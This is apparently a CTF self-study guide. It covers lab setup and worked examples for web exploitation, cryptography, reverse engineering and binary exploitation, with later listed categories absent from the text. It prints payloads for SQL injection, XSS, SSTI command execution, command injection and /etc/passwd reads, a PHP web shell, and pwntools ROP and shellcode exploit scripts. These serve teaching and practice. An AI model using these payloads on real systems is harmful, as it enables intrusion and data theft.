# The Complete CTF / Cybersecurity Self-Study Guide
### 12 Categories, Zero Guesswork — Zorin OS Lite 18.1 Edition

> This guide is built for a beginner moving fast with no fluff. Every category below includes: lab setup commands for Zorin OS Lite 18.1, core concepts explained from first principles, live worked examples with real commands/code, tools (installable + web-based + GitHub), a strict practice path, and "trick question" concepts that get tested directly or indirectly in interviews, CTFs, and certifications.
>
> **Universal Foundations (do these before anything else):**
> 1. Linux command line (navigate, permissions, piping, grep/awk/sed)
> 2. Networking (TCP/IP, DNS, HTTP, ports, OSI model)
> 3. Python (scripting, file I/O, basic data structures)
> 4. How the web works (HTTP requests, cookies, sessions, HTML/JS basics)
>
> **Best all-in-one starting platforms:** picoCTF (free, CMU, beginner-friendly, covers all categories) · TryHackMe (guided paths) · Root-Me (500+ free challenges) · HackTheBox (less hand-holding)
>
> **CTF Competition Tips:** solve the easy ones first in every category · read every word of the challenge description · run `file`, `strings`, `xxd` on every file you receive · check file extensions (a `.png` that's actually a `.zip` is classic) · look for the flag format in every output/header/comment · don't get stuck more than 30 minutes, move on · read writeups of past CTFs after finishing — that's where the real learning happens.

---

## Table of Contents
1. [Web Exploitation](#1-web-exploitation)
2. [Cryptography](#2-cryptography)
3. [Reverse Engineering](#3-reverse-engineering)
4. [Binary Exploitation (Pwn)](#4-binary-exploitation-pwn)
5. [Digital Forensics](#5-digital-forensics)
6. [Steganography](#6-steganography)
7. [Open-Source Intelligence (OSINT)](#7-open-source-intelligence-osint)
8. [Hardware & Embedded Security](#8-hardware--embedded-security)
9. [Mobile Security](#9-mobile-security)
10. [Blockchain Security](#10-blockchain-security)
11. [Network Analysis](#11-network-analysis)
12. [Miscellaneous](#12-miscellaneous)

---

## 1. Web Exploitation

### 1.1 Lab Setup (Zorin OS Lite 18.1)
```bash
sudo apt update && sudo apt install -y git python3 python3-pip curl wget

# Burp Suite Community
wget https://portswigger.net/burp/releases/download?product=community&type=Linux -O burpsuite.sh
chmod +x burpsuite.sh
sudo ./burpsuite.sh

# ffuf
sudo apt install -y golang-go
go install github.com/ffuf/ffuf/v2@latest
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc && source ~/.bashrc

# SQLMap
sudo apt install -y sqlmap

# Firefox + Burp CA cert: Burp > Proxy > Options > Import CA Cert, then import into Firefox > Certificates
```
**Core rig:** Browser → Burp Suite (middle) → Target server. Burp's Repeater tab: take any request, tweak it, resend. This is 80% of web hacking: **intercept → modify → resend → observe the difference.**

### 1.2 HTTP Is Just Text
```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=hunter2
```

### 1.3 SQL Injection
Vulnerable backend:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
**Auth bypass:** username = `admin' --` → comments out the password check, logs in as admin.
**Union-based extraction:**
```sql
' UNION SELECT username, password FROM users --
```
`UNION` stacks a second query's results onto the first, column-for-column.

Practice: PortSwigger Web Security Academy → "SQL injection" → lab "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data."
```bash
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D appdb --tables
sqlmap -u "https://target.com/page?id=1" -D appdb -T users --dump
```

### 1.4 Cross-Site Scripting (XSS)
Vulnerable code:
```php
echo "<p>You searched for: " . $_GET['q'] . "</p>";
```
Payload: `page.php?q=<script>alert(document.cookie)</script>` — real attacks POST the cookie to an attacker server silently.

**Three flavors:**
- **Reflected** — payload in the URL, fires only when a crafted link is clicked.
- **Stored** — saved in the DB (e.g. a comment), fires for every visitor.
- **DOM-based** — vuln is in client-side JS itself (`document.write(location.hash)`), server never sees the payload.

Practice: PortSwigger "Cross-site scripting" topic, all three types in order — steal a simulated admin's cookie and hijack their session.

### 1.5 Other Must-Know Vulns (Table)
| Vuln | Mechanism | Practice |
|---|---|---|
| IDOR | `?id=1002` → change to `1001`, see someone else's data, no injection needed | PortSwigger "Access control" |
| SSRF | App fetches a URL you control (`?url=http://internal-admin-panel/`) | PortSwigger "SSRF" |
| Path traversal | `?file=../../../../etc/passwd` | PortSwigger "File path traversal" |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | PortSwigger "XXE" |
| Command injection | `?host=8.8.8.8; cat /etc/passwd` | PortSwigger "OS command injection" |
| Insecure deserialization | Unserializing attacker data → RCE | PortSwigger "Deserialization" (advanced, do last) |

### 1.6 Recon Tooling
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/page?FUZZ=test -w params.txt
git clone https://github.com/danielmiessler/SecLists.git   # the standard payload/wordlist repo — reused across almost every category
```

### 1.7 Practice Path
1. PortSwigger Web Security Academy — top to bottom including everything in 1.9.
2. picoCTF web challenges (practice mode, no time pressure).
3. Hacker101 CTF (ctf.hacker101.com) — closer to real bug bounty scenarios.

### 1.8 Trick Questions
- **Why does `' OR '1'='1` work?** Makes WHERE always true, returns all rows.
- **Parameterized queries vs "sanitizing"**: prepared statements separate code from data at the driver level — the actual fix, not surface-level sanitizing.
- **`httpOnly`/`Secure` cookie flags**: `httpOnly` blocks `document.cookie` from JS, blunting XSS-based session theft even if the XSS bug exists.
- **CSRF vs XSS**: CSRF forges a request using the victim's existing session, no JS execution needed; XSS runs attacker JS inside the victim's session. Often combined.

### 1.9 Full Exhaustive Pass — Modern & Advanced Web Vulns

**CSRF (Cross-Site Request Forgery)** — browsers auto-attach cookies to any request regardless of origin:
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
Fix: anti-CSRF tokens + `SameSite=Strict/Lax`. Practice: PortSwigger "CSRF" (no-defense → token-defense → SameSite bypass).

**Clickjacking** — invisible iframe of the real site layered under a fake button:
```html
<iframe src="https://victim.com/delete-account" style="opacity:0.001; position:absolute;"></iframe>
<button style="position:absolute; top:300px;">Click to win a prize!</button>
```
Fix: `X-Frame-Options: DENY` / `Content-Security-Policy: frame-ancestors 'none'`.

**SSTI (Server-Side Template Injection)** — test payload `{{7*7}}`; if it renders `49`, escalate:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
Jinja2/Python → RCE in one payload. See HackTricks' SSTI page for per-engine payloads.

**NoSQL Injection** (MongoDB):
```json
{"username": "admin", "password": {"$ne": ""}}
```
`$ne` against empty string matches any non-empty password.

**JWT attacks**
- `alg: none` — strip signature, set `"alg":"none"`, server trusts unsigned token.
- RS256→HS256 confusion — server verifies with HS256 using the server's own *public* RSA key as the HMAC secret.
- Practice: jwt.io to decode, PortSwigger "JWT" labs.

**CORS misconfiguration** — reflecting `Access-Control-Allow-Origin` back as whatever `Origin` was sent + `Access-Control-Allow-Credentials: true` lets any site read authenticated responses cross-origin.

**HTTP Request Smuggling** — abuses front-end/back-end disagreement on `Content-Length` vs `Transfer-Encoding`, smuggling a hidden second request. PortSwigger's best advanced content — do after everything else.

**Race conditions** — e.g. firing 20 simultaneous "redeem coupon" requests before the DB marks it used. Burp's **Turbo Intruder** extension is built exactly for this.

**Insecure file upload → RCE** — `shell.php.jpg`, missing content-type validation → PHP web shell (`<?php system($_GET['cmd']); ?>`).

**GraphQL issues** — introspection left on (`__schema` dumps the whole API), batching attacks, missing depth-limiting. Tools: `InQL` (Burp extension), `graphql-cop`.

**Subdomain takeover** — DNS points to a deprovisioned service (S3 bucket, Heroku app); attacker reclaims the service name. Tools: `subjack`, `nuclei` subdomain-takeover templates.

**HTTP Parameter Pollution** — `?id=1&id=2`, exploiting inconsistent first/last-value handling across frameworks.

**Tools not mentioned above:**
- **Nuclei** — template-based scanner: `nuclei -u https://target.com -t cves/`
- **HackTricks** (book.hacktricks.xyz) — best living cheat sheet across every category, not just web.
- **Autorize** (Burp extension) — automates IDOR/access-control testing by replaying as a lower-priv user.

**Revised practice order:** PortSwigger full list (CSRF → Clickjacking → SSTI → JWT → CORS → Request smuggling → Race conditions → File upload) → picoCTF web + Hacker101 CTF → read a few retired HackerOne public disclosure reports (hackerone.com/hacktivity) to see real chaining.

---

## 2. Cryptography

### 2.1 Lab Setup
```bash
pip3 install pycryptodome gmpy2 sympy sage
git clone https://github.com/gchq/CyberChef.git   # or https://gchq.github.io/CyberChef/
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip3 install -r requirements.txt
sudo apt install -y hashcat john
sudo apt install -y sagemath
```

### 2.2 Encoding vs. Encryption vs. Hashing
| Type | Reversible? | Needs key? | Purpose | Example |
|---|---|---|---|---|
| Encoding | Yes, no key | No | Represent data differently | Base64, hex |
| Encryption | Yes, with key | Yes | Confidentiality | AES, RSA |
| Hashing | No (one-way) | No | Integrity/fingerprint | MD5, SHA-256 |

Recognition drill: `YWRtaW4=` (padding `=`, Base64 charset) → `base64 -d` → `admin`. `d41d8cd98f00b204e9800998ecf8427e` (32 hex chars) → MD5. `U2FsdGVkX1...` → OpenSSL salted blob, needs a password. CyberChef's **Magic wand** auto-detects.

### 2.3 Classical Ciphers
**Caesar** — shift every letter by N; only 25 shifts, brute force all (CyberChef "Caesar Cipher Brute Force").
**Vigenère** — repeating-key shift; crack via Kasiski examination / index of coincidence, then frequency analysis per column (dCode.fr automated solver).
**XOR** — `A^B=C` ⇒ `A^C=B` ⇒ `B^C=A`. Repeating-key XOR crackable the same way as Vigenère (find key length, frequency-analyze each byte position). This is **Cryptopals Set 1 Challenge 6**.
```python
ciphertext = bytes.fromhex("1b3737333136...")
best = (0, None, None)
for key in range(256):
    plain = bytes([c ^ key for c in ciphertext])
    score = sum(plain.count(bytes([c])) for c in b" ETAOIN")
    if score > best[0]:
        best = (score, key, plain)
print(best)
```

### 2.4 RSA — Full Attack Taxonomy
Math: `n=p*q`, `φ(n)=(p-1)(q-1)`, `d=e⁻¹ mod φ(n)`. Public `(n,e)`, private `(n,d)`. `c=m^e mod n`, `m=c^d mod n`. Security = factoring `n` being infeasible.

- **Small/factorable n**: `sympy.factorint(n)`, or at scale: `python3 RsaCtfTool.py --publickey pubkey.pem --uncipherfile ciphertext.bin`
- **Common modulus/shared prime**: `gcd(n1,n2)` nontrivial ⇒ shared factor across two public keys.
- **Low exponent (e=3), no padding, m^3<n**: `gmpy2.iroot(c,3)` — integer cube root, no factoring at all.
- **Wiener's attack**: small private exponent `d`, continued-fraction recovery. `RsaCtfTool --attack wiener`.
- **Coppersmith's attack**: partial plaintext/close primes known → lattice-based recovery (SageMath).

Practice: **CryptoHack** "RSA" course section (walks every attack above) then **Cryptopals Sets 5 & 6**.

### 2.5 Hash Cracking
```bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'   # MD5
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar -xzf rockyou.txt.tar.gz
hashcat -m 0 -a 0 hash.txt rockyou.txt
john --wordlist=rockyou.txt --format=raw-md5 hash.txt
```
**Hash length-extension attack** — if `signature = MD5(secret+message)`, you can forge a signature for `message+extra_data` without knowing the secret, via `hashpump`. This is why HMAC exists.

### 2.6 Padding Oracle Attacks (CBC)
If a server leaks any signal distinguishing valid vs invalid padding (error message, timing, status code), decrypt an entire ciphertext byte-by-byte, no key needed. **Cryptopals Set 3 Challenge 17** — implement this yourself. Tools: **PadBuster**, Burp's Bit Flipper.

### 2.7 Weak PRNGs
Python's `random` (Mersenne Twister) is predictable after capturing 624 consecutive outputs:
```python
from randcrack import RandCrack
rc = RandCrack()
for output in captured_outputs:
    rc.submit(output)
next_value = rc.predict_getrandbits(32)
```
Real-world: predictable password-reset tokens / session IDs.

### 2.8 Elliptic Curve Crypto (ECC)
- Weak curve params/small order → solvable discrete log.
- **ECDSA nonce reuse**: same nonce `k` across two signatures with same key → private key recoverable algebraically. This is how the **2010 Sony PS3 signing key leak** happened (static nonce). CryptoHack "Elliptic Curves" section.

### 2.9 Encoding Chains
Challenges "labeled crypto" are often just stacked encodings (Base64→Hex→ROT13→Base32) with no key. CyberChef's Magic wand un-stacks these in one click — always try it first.

### 2.10 Full Practice Path
Cryptopals (all 8 sets, in order, non-negotiable) → CryptoHack (RSA, DH, ECC, Lattices) → picoCTF crypto → Root-Me crypto.

### 2.11 Trick Questions (Pass 1)
- Base64 ≠ encryption: no key, fully reversible by anyone.
- ECB insecure: identical plaintext blocks → identical ciphertext blocks (the "ECB penguin"). CBC/CTR/GCM fix via chaining/nonces.
- MD5 "broken" = collision resistance broken (2004); unsuitable for passwords regardless because it's *fast* — want slow/salted/memory-hard (bcrypt/scrypt/Argon2).
- RSA needs OAEP padding — raw RSA is deterministic/malleable, vulnerable to low-exponent attack and chosen-ciphertext attacks without it.

### 2.12 Diffie-Hellman Attacks
DH: public `p,g`; each side computes `g^a mod p`/`g^b mod p`, shared secret `g^(ab) mod p`.
**Pohlig-Hellman**: if `p-1` is smooth (only small prime factors), splits discrete log into small sub-problems solved via CRT. `sage`'s `discrete_log()`.
**Logjam (2015)**: real-world case study — weak hardcoded 512-bit export-grade DH groups, downgrade + precompute to break connections live.
CryptoHack "Diffie-Hellman" section.

### 2.13 Block Cipher Modes Beyond ECB/CBC
- **CTR mode**: block cipher as stream cipher. **Nonce reuse** → XOR two ciphertexts, keystream cancels, left with `plaintext1 XOR plaintext2` → back to XOR-crack (2.3).
- **GCM mode**: same nonce-reuse catastrophe, PLUS leaks the authentication key, enabling message forgery (the "forbidden attack") — a real named TLS vulnerability class.
- **OFB/CFB**: same family, different error-propagation.
Practice: Cryptopals Set 1 Ch.8 ("Detect AES in ECB mode"), Set 3 CTR challenges.

### 2.14 Bleichenbacher's Attack (PKCS#1 v1.5 padding oracle on RSA)
Separate from CBC padding oracle. If RSA server leaks whether PKCS#1 v1.5 padding was valid, decrypt/forge via adaptive chosen-ciphertext queries — this is exactly what the **ROBOT attack (2017)** exploited against Facebook, PayPal and others. Cryptopals Set 6 Ch.47-48.

### 2.15 Timing / Side-Channel Attacks
Byte-by-byte comparison that returns early on mismatch (`if a[i]!=b[i]: return False`) leaks timing differences — brute-force one byte at a time via response-time measurement. Defense: constant-time comparison (`hmac.compare_digest()` / `secrets.compare_digest()`).

### 2.16 Real-World TLS CVE Case Studies
- **Heartbleed (2014)** — OpenSSL buffer over-read, up to 64KB server memory leaked per request.
- **POODLE (2014)** — padding oracle in SSLv3 CBC, forced downgrade.
- **FREAK / Logjam** — downgrade to deliberately weakened export-grade crypto.
- **BEAST** — predictable IVs in TLS 1.0 CBC.

### 2.17 Lattice Attacks (LLL)
```bash
pip3 install fpylll
```
Used for Coppersmith's, related-message RSA attacks, and ECDSA nonce-bias lattice attacks (even a few leaked bits per signature across many signatures is enough). CryptoHack "Lattices" section.

### 2.18 Other Gaps
- **One-time pad (OTP)**: theoretically unbreakable only if truly random, used once, as long as the message. Reused key ⇒ reduces to CTR nonce-reuse XOR attack (2.13).
- **Shamir's Secret Sharing** — N pieces, K-of-N reconstruct via Lagrange interpolation. `pip3 install secretsharing`.
- **Post-quantum awareness** — Shor's algorithm breaks RSA/ECC in polynomial time on a quantum computer; NIST standardized Kyber/Dilithium (2024) in response.
- **openssl CLI**:
```bash
openssl enc -aes-256-cbc -d -in file.enc -out file.dec -k password
openssl x509 -in cert.pem -text -noout
openssl rsa -in key.pem -text -noout
```
- **factordb.com** — check if a large `n` is already factored/stored before running your own attack.

### 2.19 Final Practice Path
Cryptopals (all 8) → CryptoHack (RSA, DH, ECC, Lattices) → picoCTF/Root-Me → read Heartbleed/POODLE/Logjam/ROBOT as named case studies (10 min each).

### 2.20 Trick Questions (Pass 2)
- Why does ECC nonce reuse leak the private key? Algebraic recovery from two signatures sharing `k`.
- Why is factordb not "cheating"? Everyone uses it; saves huge time, it's a public resource not an exploit.
- Why move to post-quantum now? Shor's algorithm is a future threat but migration/standardization takes years, hence proactive NIST standardization already happened.

---

## 3. Reverse Engineering

### 3.1 Lab Setup
```bash
sudo apt install -y openjdk-21-jdk
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2_build/ghidra_11.2_PUBLIC_20241105.zip
unzip ghidra_11.2_PUBLIC_20241105.zip && cd ghidra_11.2_PUBLIC/ && ./ghidraRun

sudo apt install -y radare2
git clone https://github.com/rizinorg/cutter.git

sudo apt install -y gdb
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

pip3 install checksec.py
# file, strings, xxd, objdump — already present
```

### 3.2 x86-64 Fundamentals
Registers: `rax,rbx,rcx,rdx,rsi,rdi,rbp,rsp,r8-r15`. Args 1-6: `rdi,rsi,rdx,rcx,r8,r9`. `rsp`=stack pointer, `rbp`=base pointer, `rip`=instruction pointer (the Category 4 exploitation target).
```asm
mov edi, 0x1
mov esi, 0x2
call add_numbers        ; args set via mov before call — 50% of reading disassembly
```
Stack frame:
```asm
push rbp
mov  rbp, rsp
sub  rsp, 0x20
...
leave   ; mov rsp,rbp ; pop rbp
ret
```

### 3.3 Static vs Dynamic Analysis
Static = Ghidra/objdump/strings, no execution, safe, misses runtime-computed values. Dynamic = GDB/pwndbg, strace/ltrace, necessary when static alone can't tell you a value. Start static, switch dynamic the moment you hit something you can't reason about.

### 3.4 First Real Crackme
```bash
file ./crackme
strings ./crackme | less
checksec ./crackme
```
Open in Ghidra: New Project → Import File → auto-analyze → find `main`.
Easiest case — hardcoded `strcmp`:
```c
if (strcmp(input, "S3cr3tP4ss!") == 0) { printf("Correct!\n"); }
```
Harder — XOR check:
```c
for (int i=0;i<strlen(input);i++) if ((input[i]^key[i]) != expected[i]) return 0;
```
Reverse the constraints in Python (`input[i] = expected[i]^key[i]`) rather than reading the password directly.

### 3.5 Dynamic Analysis with GDB/pwndbg
```bash
gdb ./crackme
(gdb) break *main
(gdb) run
(gdb) info registers
(gdb) x/20xb $rsp
(gdb) x/s $rdi
(gdb) ni   # step over
(gdb) si   # step into
(gdb) continue
```

### 3.6 Pattern Recognition Table
| Decompiled pattern | Meaning |
|---|---|
| `strcmp`/`strncmp`/`memcmp` literal | Direct password check |
| Loop XORing input vs byte array | Custom cipher, reverse in Python |
| `MD5_Update`/`SHA256_Update` then compare | Hash check — can't reverse, brute-force or find a logic bypass |
| Relational arithmetic constraints | Solve with Z3, not by hand |
| Unused-looking branch | Hidden backdoor check — scan every comparison |

Z3 for complex constraint systems:
```bash
pip3 install z3-solver
```
```python
from z3 import *
s = Solver()
chars = [BitVec(f'c{i}', 8) for i in range(10)]
s.add(chars[0] + chars[1] == 200)
s.add(chars[0] ^ chars[2] == 0x15)
if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[c].as_long()) for c in chars))
```

### 3.7 Symbolic Execution with angr
```bash
pip3 install angr
```
```python
import angr
proj = angr.Project('./crackme', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=lambda s: b"Correct!" in s.posix.dumps(1))
if simgr.found:
    print(simgr.found[0].posix.dumps(0))
```

### 3.8 ELF/PE File Formats
```bash
readelf -h ./crackme
readelf -S ./crackme
objdump -d ./crackme
```
Know `.text`/`.data`/`.bss`/`.rodata`/`.plt`/`.got`. PE (Windows): x64dbg or PE-bear; IAT reveals API usage/behavior hints.

### 3.9 Anti-RE Tricks
- **Anti-debugging**: `ptrace(PTRACE_TRACEME,...)` check — NOP it out, or `LD_PRELOAD` a fake ptrace.
- **Packing (UPX)**: `upx -d packed -o unpacked`. Custom packer: break after unpacking loop, dump memory with GDB.
- **Control-flow obfuscation**: opaque predicates (`if ((x*x)>=0)` always true) — trace manually or patch out.
- **String obfuscation**: strings decrypted at runtime — breakpoint after decryption, dump memory.

### 3.10 Bytecode Reverse Engineering
- **Java**: `java -jar cfr.jar MyApp.class` or JD-GUI — near-perfect decompilation.
- **.NET**: dnSpy / ILSpy — near-perfect C# decompilation, editable/recompilable in dnSpy directly.
- **Python .pyc**: `pip3 install uncompyle6; uncompyle6 script.pyc > script.py` (or decompyle3 for newer Python).
Always `strings | grep -iE "rustc|golang|GOROOT|python|jvm|\.NET"` first to pick the right toolchain.

### 3.11 ARM (bridges to Mobile/Hardware)
32-bit: `r0-r12,sp,lr,pc`, args in `r0-r3`. 64-bit (AArch64): `x0-x30`, args in `x0-x7`. Ghidra auto-detects architecture on import.

### 3.12 YARA
```bash
sudo apt install -y yara
```
```yara
rule Suspicious_Strings {
    strings: $a = "cmd.exe" $b = "CreateRemoteThread"
    condition: all of them
}
```
`yara myrule.yar ./suspect_binary` — pattern-match at scale, used in malware triage and forensics.

### 3.13 Ghidra Scripting
Window → Script Manager — automate repetitive tasks (e.g. find every `strcmp` call + involved strings across a large binary) via Python/Java console.

### 3.14 Practice Path
Crackmes.one (by difficulty) → picoCTF reversing → **pwn.college** Reverse Engineering module (builds toward their pwn modules) → Reversing.kr → 2-3 Java/.NET bytecode challenges specifically.

### 3.15 Trick Questions (Pass 1)
- Ghidra decompiler isn't 100% accurate — heuristic reconstruction; optimized compiler output can mislead, cross-check raw asm.
- Static vs dynamic linking affects RE: static = huge, needs FID/BinDiff for library-function ID; dynamic = smaller, needs correct shared libs present.
- Disassembler (1:1, always accurate) vs decompiler (lossy, heuristic reconstruction).
- Stripped binary: no symbol names, identify function purpose by behavior not name.

### 3.16 Modern-Language Binaries
**Go**: statically linked, huge (2-5MB "hello world"), retains function names via `runtime.pclntab` even when "stripped." `strings | grep -i "runtime.go\|GOROOT\|goroutine"`. Pre-1.17 Go passed args on stack, not registers — check version first.
**Rust**: mangled symbols (`_ZN4core6option...`) — demangle with `rustfilt`. `panic!` messages leak source paths (`src/main.rs:42`). Memory safety reduces classic overflow bugs — look for `unsafe` blocks/FFI boundaries instead.
Fingerprint fast: `strings ./binary | grep -iE "rustc|golang|GOROOT|python|jvm|\.NET"`.

### 3.17 Patch Diffing
Compare two binary versions (before/after a patch) to find exactly what changed — how researchers find n-day exploits from vendor patch notes.
```bash
git clone https://github.com/joxeankoret/diaphora
```
BinDiff (Google/Zynamics) also standard.

### 3.18 Emulation
```bash
sudo apt install -y qemu-user qemu-user-static
qemu-arm -L /usr/arm-linux-gnueabihf ./arm_binary
```
**Unicorn Engine** — emulate just one function/snippet in a Python script:
```bash
pip3 install unicorn
```
Used heavily to de-obfuscate custom crypto/VM routines without full RE.

### 3.19 VM-Based Obfuscation
Advanced crackmes implement a custom bytecode VM inside the binary — Ghidra only shows a generic fetch-decode-execute loop. Approach: identify the interpreter loop, understand its ~<20 opcode instruction set, write your own emulator or use Unicorn against controlled inputs rather than statically decoding. Search CTFtime for "VM obfuscation"/"custom VM" writeups.

### 3.20 Commercial Protectors
**VMProtect, Themida** — industrial anti-debug + packing + VM obfuscation + anti-tamper, combined. Recognizing these by name saves wasted hours assuming it's a simple crackme.

### 3.21 Mach-O (macOS)
```bash
otool -hv ./binary
otool -L ./binary
class-dump ./binary   # Objective-C class/method recovery
```
Ghidra opens Mach-O natively.

### 3.22 WebAssembly (Wasm)
```bash
sudo apt install -y wabt
wasm2wat binary.wasm -o binary.wat
```
Growing CTF category; `.wat` text format is simple stack-based bytecode. Ghidra has a Wasm analysis extension.

### 3.23 Memory Scanning / Game Hacking
**Cheat Engine** (via Wine) — live memory scanning: find a value, filter as it changes, narrow to the exact address, read/write live. Great unusual on-ramp to RE — transfers conceptually to debugger-based memory inspection later.

### 3.24 Compiler/Architecture Fingerprinting Ritual
```bash
file ./binary
strings ./binary | grep -iE "gcc|clang|rustc|go1\.|\.NET|python"
checksec ./binary
```
Do this in under 30 seconds on every binary before opening Ghidra.

### 3.25 Updated Practice Path
Everything from 3.14, plus: one Go crackme + one Rust crackme from crackmes.one specifically · 2-3 CTFtime "VM obfuscation" writeups (read, don't attempt solo yet) · one Wasm challenge via `wasm2wat`.

### 3.26 Trick Questions (Pass 2)
- Why can't you always trust `strings`? Only finds printable sequences as-is; runtime-decrypted strings, Go metadata, packed binaries all defeat it — first-pass triage only.
- IDA Pro vs Ghidra: IDA's FLIRT signature system still generally ahead of Ghidra's FID for recognizing known library functions in stripped static binaries.
- Why does a stripped Go binary still show function names? Go's runtime embeds its own symbol/metadata table for panic stack traces, independent of the ELF symbol table `strip` removes.

---

## 4. Binary Exploitation (Pwn)

### 4.1 Lab Setup
```bash
pip3 install pwntools
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
pip3 install ROPgadget
sudo apt install -y ruby && gem install one_gadget
pip3 install checksec.py
sudo apt install -y patchelf
git clone https://github.com/niklasb/libc-database && cd libc-database && ./get ubuntu
```

### 4.2 Core Idea
Memory layout (low→high): `.text` → `.data/.bss` → heap (grows up) → ... → stack (grows down). Every function call pushes a return address. Pwn = find a way to control what influences where the CPU jumps next (`rip`) or what data it trusts.

### 4.3 checksec — Read First, Always
| Protection | What it does | Impact |
|---|---|---|
| Canary | Random value before return address | Must leak or avoid overwriting |
| NX/DEP | Stack/heap non-executable | No shellcode-on-stack; reuse existing code (ROP) |
| PIE | Randomized binary base | Need a leak to calculate addresses |
| RELRO | GOT read-only after startup | Full RELRO blocks GOT overwrite |
| ASLR | Randomized stack/heap/lib bases | Same as PIE — need a leak |

### 4.4 Stack Buffer Overflow — Live
```c
void vuln() { char buf[64]; gets(buf); }
```
```bash
python3 -c "from pwn import *; print(cyclic(200))"
(gdb) info registers rip
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```
```python
from pwn import *
elf = ELF('./vuln')
p = process('./vuln')
offset = 72
payload = b'A' * offset + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
```
Practice: **pwn.college** first modules, in exact order.

### 4.5 Stack Canaries — Leak & Bypass
1. **Leak it** via a format-string/print bug, include correct value in overflow payload.
2. **Brute-force byte-by-byte** if the service `fork()`s (same canary per child) — 256×8=2048 worst case.
3. **Avoid it entirely** — overwrite rip via another path (function pointer in a struct, format string `%n` write).

### 4.6 ROP / ret2libc (NX Bypass)
```bash
ROPgadget --binary ./vuln --only "pop|ret"
```
```python
from pwn import *
elf = ELF('./vuln'); libc = ELF('./libc.so.6')
p = process('./vuln')
pop_rdi = 0x0000000000401263
bin_sh = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']
payload = b'A'*offset + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
p.sendline(payload)
p.interactive()
```
With ASLR/PIE on libc: leak via first-stage ROP (e.g. `puts(puts_got_entry)`), calculate base, identify exact libc via:
```bash
cd libc-database && ./find puts <leaked_address_in_hex>
```

### 4.7 Format String Vulnerabilities
```c
printf(user_input);  // should be printf("%s", user_input)
```
Leak: `%x.%x.%x.%x.%x` prints stack values. `%n` = **arbitrary memory write** (writes bytes-printed-so-far to the corresponding argument's address). Positional specifiers (`%7$x`) target precisely.
```python
from pwn import *
payload = fmtstr_payload(offset, {target_addr: value_to_write})
```

### 4.8 GOT/PLT Overwrite
PLT = stub jumping through GOT = actual runtime function address, resolved lazily. With an arbitrary write (format string, or overflow into a global pointer) and **Partial/No RELRO**, overwrite a GOT entry (e.g. `printf`→`system`) so the next call triggers your target function instead.

### 4.9 Heap Exploitation
- **Use-After-Free (UAF)** — stale pointer to freed, reallocated memory.
- **Double-Free** — corrupts free-list bookkeeping, can return the same chunk twice.
- **Heap overflow** — corrupts next chunk's metadata (size, fd/bk pointers).
Key terms: `tcache`, `fastbin`, `unsorted bin`, `chunk size/prev_size`, `fd`/`bk`.
**Tcache poisoning**: free a chunk, overwrite its `fd` via UAF/overflow with an arbitrary address — next two `malloc()`s of that size return the original chunk, then your chosen address (arbitrary-write primitive).
```
(gdb) heap
(gdb) bins
(gdb) vis_heap_chunks
```
Practice: pwn.college's heap module, in order, before HTB/picoCTF heap challenges.

### 4.10 Shellcode
Rare now (NX usually on), but some beginner binaries disable it deliberately.
```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A'*(offset-len(shellcode)) + p64(stack_addr_of_shellcode)
```

### 4.11 Standard Exploit Skeleton
```python
from pwn import *
context.binary = elf = ELF('./vuln')
io = process('./vuln')          # or remote('target.com', 1337)
io.sendlineafter(b'prompt: ', payload)
io.interactive()
```

### 4.12 Practice Path
pwn.college (spine, in order) → picoCTF binary exploitation → Pwnable.kr → Pwnable.tw & HackTheBox pwn.

### 4.13 Trick Questions (Pass 1)
- ASLR + info leak: leak gives you base, internal offsets are fixed per libc version ⇒ `base+known_offset`.
- Heap overflows harder than stack: corrupting allocator metadata is version-dependent (tcache keys, safe-linking in glibc 2.32+).
- Why `system("/bin/sh")` as the end goal: interactive shell gives unrestricted follow-on access; `one_gadget` finds pre-built one-instruction shell spawns.
- Safe-linking (glibc ≥2.32): obfuscates tcache `fd` pointers via a formula using the chunk's own address, defeats naive tcache poisoning.

### 4.14 Kernel Exploitation
```bash
qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio.gz -append "console=ttyS0 nokaslr" -nographic -s
```
`nokaslr` only while developing locally — real challenges leave it on.
Core concepts: **SMEP/SMAP** (kernel-level NX, defeated via kernel ROP), **`commit_creds(prepare_kernel_cred(0))`** (sets UID 0 — the kernel's `system("/bin/sh")` equivalent), **kASLR**. Practice: pwn.college's kernel module (most advanced content, do last).

### 4.15 Sandboxes and Seccomp
```bash
gem install seccomp-tools
seccomp-tools dump ./vuln
```
If `execve` is blocked but `open`/`read`/`write` allowed, write a syscall-constrained ROP chain that reads the flag file directly instead of spawning a shell.

### 4.16 Kernel-Level Race Conditions (TOCTOU)
Distinct from web races (1.9). Check-then-use gap in a kernel module — a second thread swaps the underlying resource between check and use. Fired via tight-loop thread harnesses.

### 4.17 Browser (V8) Exploitation
Modern "pwn" tracks include V8/SpiderMonkey exploitation via crafted JS triggering type-confusion bugs → OOB read/write primitives → `addrof()`/`fakeobj()` built entirely in JS. Years-beyond-beginner specialty. Entry points: d0nut's V8 series, CTFtime "v8" writeups.

